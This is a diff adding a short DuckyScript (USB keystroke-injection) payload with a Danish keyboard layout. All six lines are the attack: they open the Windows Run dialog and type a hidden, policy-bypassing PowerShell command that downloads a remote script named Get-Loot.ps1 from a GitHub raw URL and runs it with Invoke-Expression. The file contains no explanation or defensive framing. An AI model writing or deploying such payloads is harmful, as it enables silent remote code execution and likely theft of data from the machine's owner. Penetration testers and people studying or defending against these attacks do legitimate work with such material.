@@ -1,0 +1,6 @@
+DUCKY_LANG DA
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/imabdk/PowerShell/master/Get-Loot.ps1?dl=1;Invoke-Expression $pl
+ENTER
